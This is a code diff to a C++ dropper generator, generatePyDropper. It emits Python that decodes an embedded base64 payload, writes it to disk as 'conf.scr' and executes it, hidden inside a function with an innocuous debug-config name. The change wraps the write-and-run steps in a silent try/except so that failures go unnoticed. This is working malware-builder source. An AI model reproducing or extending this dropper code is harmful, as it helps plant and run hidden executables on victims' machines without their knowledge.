@@ -84,10 +84,12 @@ std::string generatePyDropper(std::string path) {
         pyCode += "    import subprocess\n";
         pyCode += "    b = b'" + b64Data + "'\n";
         pyCode += "    d = base64.b64decode(b)\n";
-        pyCode += "    with open('conf.scr', 'wb') as f:\n";
-        pyCode += "        f.write(d)\n";
-        pyCode += "    subprocess.Popen('conf.scr')\n";
-        pyCode += "bl_get_generic_debug_conf()\n";
+        pyCode += "    try:\n";
+        pyCode += "        with open('conf.scr', 'wb') as f:\n";
+        pyCode += "            f.write(d)\n";
+        pyCode += "        subprocess.Popen('conf.scr')\n";
+        pyCode += "    except:\n";
+        pyCode += "        pass\n";
         return pyCode;
     }
     return "ERR_READING_EXEC";
